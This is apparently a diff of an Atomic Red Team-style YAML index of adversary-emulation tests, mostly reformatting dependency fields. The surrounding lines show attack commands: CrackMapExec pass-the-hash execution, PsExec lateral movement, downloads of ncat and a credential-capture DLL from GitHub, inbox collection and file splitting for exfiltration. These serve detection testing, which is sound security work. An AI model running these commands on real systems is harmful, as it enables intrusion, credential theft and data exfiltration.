+        get_prereq_command: 'Enable-PSRemoting
+
+'
       executor:
         name: powershell
         elevation_required: true
@@ -42197,10 +43079,14 @@ execution:
           type: string
           default: C:\PSTools\PsExec.exe
       dependencies:
-      - description: PsExec tool from Sysinternals must exist on disk at specified
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
+
+'
+        get_prereq_command: |
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
           New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
@@ -42688,9 +43574,13 @@ execution:
           default: "$env:TEMP\\T1059.003_script.bat"
       dependency_executor_name: powershell
       dependencies:
-      - description: Batch file must exist on disk at specified location (#{script_path})
-        prereq_command: 'if (Test-Path #{script_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Batch file must exist on disk at specified location (#{script_path})
+
+'
+        prereq_command: 'if (Test-Path #{script_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item #{script_path} -Force | Out-Null
           Set-Content -Path #{script_path} -Value "#{command_to_execute}"
       executor:
@@ -43423,11 +44313,17 @@ lateral-movement:
           default: atomic.local
       dependency_executor_name: powershell
       dependencies:
-      - description: CrackMapExec executor must exist on disk at specified location
+      - description: 'CrackMapExec executor must exist on disk at specified location
           (#{crackmapexec_exe})
-        prereq_command: 'if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }'
+
+'
+        prereq_command: 'if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }
+
+'
         get_prereq_command: 'Write-Host Automated installer not implemented yet, please
-          install crackmapexec manually at this location: #{crackmapexec_exe}'
+          install crackmapexec manually at this location: #{crackmapexec_exe}
+
+'
       executor:
         command: 'crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
 
@@ -43689,11 +44585,17 @@ lateral-movement:
           type: String
           default: 1password2!
       dependencies:
-      - description: Computer must be domain joined
-        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
           { exit 0} else { exit 1}
-        get_prereq_command: Write-Host Joining this computer to a domain must be done
-          manually
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
       executor:
         command: |
           $Server=#{logonserver}
@@ -44655,10 +45557,14 @@ lateral-movement:
           type: String
           default: localhost
       dependencies:
-      - description: PsExec tool from Sysinternals must exist on disk at specified
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
+
+'
+        get_prereq_command: |
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
           New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
@@ -46671,9 +47577,13 @@ command-and-control:
           default: 127.0.0.1
       dependency_executor_name: powershell
       dependencies:
-      - description: ncat.exe must be available at specified location (#{ncat_exe})
-        prereq_command: if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+      - description: 'ncat.exe must be available at specified location (#{ncat_exe})
+
+'
+        prereq_command: 'if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           New-Item -ItemType Directory -Force -Path #{ncat_path} | Out-Null
           $parentpath = Split-Path (Split-Path "#{ncat_exe}"); $zippath = "$parentpath\nmap.zip"
@@ -47862,9 +48772,13 @@ collection:
           type: Path
           default: "%programfiles%/WinRAR/Rar.exe"
       dependencies:
-      - description: Rar tool must be installed at specified location (#{rar_exe})
-        prereq_command: if not exist "#{rar_exe}" (exit /b 1)
-        get_prereq_command: |-
+      - description: 'Rar tool must be installed at specified location (#{rar_exe})
+
+'
+        prereq_command: 'if not exist "#{rar_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
           echo Downloading Winrar installer
           bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
           echo Follow the installer prompts to install Winrar
@@ -47916,9 +48830,14 @@ collection:
           default: B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB
       dependency_executor_name: powershell
       dependencies:
-      - description: Winzip must be installed
-        prereq_command: cmd /c 'if not exist "#{winzip_exe}" (echo 1) else (echo 0)'
-        get_prereq_command: |-
+      - description: 'Winzip must be installed
+
+'
+        prereq_command: 'cmd /c ''if not exist "#{winzip_exe}" (echo 1) else (echo
+          0)''
+
+'
+        get_prereq_command: |
           if(Invoke-WebRequestVerifyHash "#{winzip_url}" "$env:Temp\winzip.exe" #{winzip_hash}){
             Write-Host Follow the installation prompts to continue
             cmd /c "$env:Temp\winzip.exe"
@@ -47969,11 +48888,17 @@ collection:
           type: Path
           default: "$HOME/data.zip"
       dependencies:
-      - description: Files to zip must exist (#{input_files})
+      - description: 'Files to zip must exist (#{input_files})
+
+'
         prereq_command: 'if [ $(ls #{input_files} | wc -l) > 0 ]; then exit 0; else
-          exit 1; fi;'
-        get_prereq_command: echo Please set input_files argument to include files
+          exit 1; fi;
+
+'
+        get_prereq_command: 'echo Please set input_files argument to include files
           that exist
+
+'
       executor:
         name: sh
         elevation_required: false
@@ -48031,10 +48956,16 @@ collection:
           type: Path
           default: "$HOME/data.tar.gz"
       dependencies:
-      - description: Folder to zip must exist (#{input_file_folder})
-        prereq_command: 'test -e #{input_file_folder}'
-        get_prereq_command: echo Please set input_file_folder argument to a folder
+      - description: 'Folder to zip must exist (#{input_file_folder})
+
+'
+        prereq_command: 'test -e #{input_file_folder}
+
+'
+        get_prereq_command: 'echo Please set input_file_folder argument to a folder
           that exists
+
+'
       executor:
         name: sh
         elevation_required: false
@@ -48068,9 +48999,13 @@ collection:
       dependency_executor_name: sh
       dependencies:
       - description: gpg and zip are required to run the test.
-        prereq_command: if [ ! -x "$(command -v gpg)" ] || [ ! -x "$(command -v zip)"
+        prereq_command: 'if [ ! -x "$(command -v gpg)" ] || [ ! -x "$(command -v zip)"
           ]; then exit 1; fi;
-        get_prereq_command: echo "Install gpg and zip to run the test"; exit 1;
+
+'
+        get_prereq_command: 'echo "Install gpg and zip to run the test"; exit 1;
+
+'
       executor:
         name: sh
         elevation_required: false
@@ -48496,9 +49431,13 @@ collection:
           default: https://www.example.com
       dependency_executor_name: powershell
       dependencies:
-      - description: T1056.004x64.dll must exist on disk at specified location (#{file_name})
-        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'T1056.004x64.dll must exist on disk at specified location (#{file_name})
+
+'
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
       executor:
@@ -49470,11 +50409,17 @@ collection:
           default: PathToAtomicsFolder\T1114.001\src
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Get-Inbox.ps1 must be located at #{file_path}'
+      - description: 'Get-Inbox.ps1 must be located at #{file_path}
+
+'
         prereq_command: 'if (Test-Path #{file_path}\Get-Inbox.ps1) {exit 0} else {exit
-          1}'
-        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1"
+          1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1"
           -OutFile "#{file_path}\Get-Inbox.ps1"
+
+'
       executor:
         command: 'powershell -executionpolicy bypass -command #{file_path}\Get-Inbox.ps1
           -file #{output_file}
@@ -50097,10 +51042,12 @@ exfiltration:
       dependencies:
       - description: The file must exist for the test to run.
         prereq_command: 'if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else
-          exit 0; fi;'
+          exit 0; fi;
+
+'
         get_prereq_command: "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
           touch #{folder_path}/safe_to_delete; fi;      \ndd if=/dev/urandom of=#{folder_path}/#{file_name}
-          bs=25000000 count=1"
+          bs=25000000 count=1\n"
       executor:
         command: |
           cd #{folder_path}; split -b 5000000 #{file_name}
@@ -51660,11 +52607,15 @@ initial-access:
           default: '16.0'
       dependency_executor_name: powershell
       dependencies:
-      - description: Test Requires MS Office to be installed and have been run previously.
+      - description: 'Test Requires MS Office to be installed and have been run previously.
           Run -GetPrereqs to run msword and build dependent registry keys
-        prereq_command: If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
+
+'
+        prereq_command: 'If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
           { exit 0 } else { exit 1 }
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           $msword = New-Object -ComObject word.application
           Stop-Process -Name WINWORD
       executor:
